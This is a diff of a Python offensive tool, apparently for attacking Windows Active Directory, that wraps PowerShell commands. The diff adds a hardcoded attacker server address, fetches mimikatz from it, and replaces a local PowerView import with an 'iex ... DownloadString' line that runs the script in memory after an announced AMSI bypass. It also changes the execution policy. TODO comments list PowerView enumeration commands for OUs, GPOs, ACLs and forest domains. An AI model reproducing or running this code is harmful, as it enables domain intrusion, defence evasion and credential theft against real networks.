@@ -1,14 +1,15 @@
 from colorama import Fore
 import getpass,time,sys
-import subprocess,os
+import subprocess,os,socket
 from tabulate import tabulate
 from prettytable import PrettyTable
 
+
+IpServer="192.168.73.139"
 username=getpass.getuser()
-lista_tools=["PowerView.ps1","PowerUp.ps1"]
 root=f"C:\\Users\\{username}\\Desktop\\Lelanto\\"
 data=f"{root}data\\"
-mimikatz=data+"x64\\"+"mimikatz.exe"
+mimikatz=f"http://{IpServer}/x64/mimikatz.exe"
 ok=f"{Fore.GREEN}[INFO]{Fore.WHITE}"
 error=f"{Fore.RED}[ERROR]{Fore.WHITE}"
 warning=f"{Fore.YELLOW}[WARNING]{Fore.WHITE}"
@@ -46,9 +47,9 @@ def stepONE_setupPolicy():
         print(error + " An error occured: %s", hello_info.stderr)
     else:
         value=cleanstring(value)
-        if value != "Unrestricted":
+        if value != "RemoteSigned":
             print(f"{warning} The actual policy doesn't run any powershell script...Now I'll change it")
-            policy="Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted"
+            policy="Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned"
             value=powershell_commandLine(policy)
             policy="Get-ExecutionPolicy"
             value=powershell_commandLine(policy)
@@ -59,44 +60,17 @@ def stepONE_setupPolicy():
                 print(f"{ok} Actual state: {value}")
         else:
             print(f"{ok} Actual state: {value}")
-
-
-#TODO: Installing other tools like mimikatz
-def stepTWO_Installing_tools():
-    #print("\n======================================================================================================\n")
-    print(f"\n{ok} 2-Starting with the Installing Tools...\n")
-    lista_tool_mancanti=[]
-    trovato=0
-    count=1
-    for tool in lista_tools:
-        path=data+tool
-        found=os.path.isfile(path)
-        if found:
-            print(f"{ok} {count}) Program {tool} FOUND!!!")
-            trovato=1
-            count=count+1
-        else:
-            lista_tool_mancanti.append(tool)
     
-    path=data+"x64\\"+"mimikatz.exe"
-    found=os.path.isfile(path)
-    if found:
-        print(f"{ok} {count}) Program mimikatz FOUND!!!")
-        count=count+1
+    print(f"\n{warning} Check Server status...")
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    result = sock.connect_ex((IpServer, 80))
+    if result == 0:
+        print (f"{ok} Server is UP")
+    else:
+        print (f"{error} Server is DOWN. Please run the server and run this tool again...")
+        sys.exit(0)
 
-    '''
-    if len(lista_tool_mancanti) > 0:
-        response = os.system("ping " + ping)
-        if response == 0:
-            print("\n")
-            print (f"{ok} The server is up!!")
-            downloadPV=f"IEX (New-Object Net.WebClient).DownloadFile('http://192.168.73.132/Recon/01302022_22_46_52/01302022_22_46_52.ps1','{data}{lista_tools[0]}');"
-            print(f"{ok} Downloading Powerview")
-            powershell_commandLine(downloadPV)
-        else:
-            print (f"{errore} The server is down!!!")
-   
-    '''
+
 
 def title():
     print(Fore.BLUE)
@@ -136,15 +110,16 @@ TODO: Vedere pc dentro un OU Get-NetOU Groups | select cn | %{Get-NetComputer | 
 TODO:Enumerare GPO applicati ad una OU: (Get-NetOU <nome OU>).gplink
 TODO: get-NetGPO -ADSpAth 'LDAP...'
 TODO: le 2 righe sopra si possono unire in questo comando: Get-NetGPO -ADSpath ((Get-NetOU StudentMachines -FullData).gplink.split(";")[0] -replace "^.")
-TODO:ACL Get-ObjectAcl -SamAccountName "spiderman" -ResolveGUIDs -Verbose | select ActiveDirectoryRights,ObjectAceType,AceQualifier
+TODO: ACL Get-ObjectAcl -SamAccountName "spiderman" -ResolveGUIDs -Verbose | select ActiveDirectoryRights,ObjectAceType,AceQualifier
 TODO: Enumerate all domains in the forest: Get-NetForestDomain -Verbose | select name
 '''
 def StepTHREE_Enumeration():
-    print(f"\n{ok} 3-Starting with the enumeration...\n")
+    print(f"\n{ok} 2-Starting with the enumeration...\n")
     time.sleep(1)
     print(f"{ok} Bypassing AMSI Security...")
     bypass=configurazione()
-    command0=bypass + "; " + f"Import-Module {data}PowerView.ps1" + "; "
+    #command0=bypass + "; " + f"Import-Module {data}PowerView.ps1" + "; "
+    command0=bypass + "; " + f"iex (New-Object Net.WebClient).DownloadString('http://{IpServer}/PowerView.ps1')" + "; "
     command1=command0 + " Get-NetDomain"
     value=powershell_commandLine(command1)
     value=cleanstring(value)
